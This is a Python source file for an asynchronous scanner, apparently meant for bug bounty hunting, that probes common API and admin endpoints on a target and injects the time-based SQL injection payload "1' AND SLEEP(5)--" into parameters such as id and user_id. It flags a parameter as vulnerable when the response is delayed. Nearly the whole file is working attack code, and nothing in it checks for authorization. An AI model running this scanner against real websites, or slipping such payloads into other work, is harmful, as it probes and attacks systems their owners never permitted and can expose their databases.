import aiohttp, asyncio, time
from urllib.parse import urljoin

COMMON_ENDPOINTS = ["/api/user", "/api/profile", "/admin", "/dashboard"]
COMMON_PARAMS = ["id", "user_id", "account", "uid"]

class SovereignBBEngine:
    def __init__(self, concurrency=20):
        self.sem = asyncio.Semaphore(concurrency)

    async def run(self, target):
        findings = await self.discover(target)
        results = []

        for f in findings:
            valid, evidence = await self.validate(f)
            if not valid:
                continue
            impact = self.escalate(f, evidence)
            if not impact:
                continue
            f["impact"] = impact
            f["evidence"] = evidence
            results.append(f)

        return results

    async def discover(self, base):
        findings = []
        async with aiohttp.ClientSession() as session:
            for ep in COMMON_ENDPOINTS:
                url = urljoin(base, ep)
                async with self.sem:
                    try:
                        async with session.get(url, timeout=10) as r:
                            if r.status in (200,401,403):
                                for p in COMMON_PARAMS:
                                    findings.append({
                                        "url": url,
                                        "param": p,
                                        "type": "PARAM_TEST"
                                    })
                    except:
                        continue
        return findings

    async def validate(self, f):
        if f["type"] == "PARAM_TEST":
            payload = "1' AND SLEEP(5)--"
            params = {f["param"]: payload}
            async with aiohttp.ClientSession() as session:
                start = time.time()
                try:
                    async with session.get(f["url"], params=params, timeout=10) as r:
                        pass
                except:
                    return False, None
            delay = time.time() - start
            return delay > 4.5, {"delay": round(delay, 2)}
        return False, None

    def escalate(self, f, evidence):
        if f["type"] == "PARAM_TEST":
            return "Time-based SQL Injection"
        return None
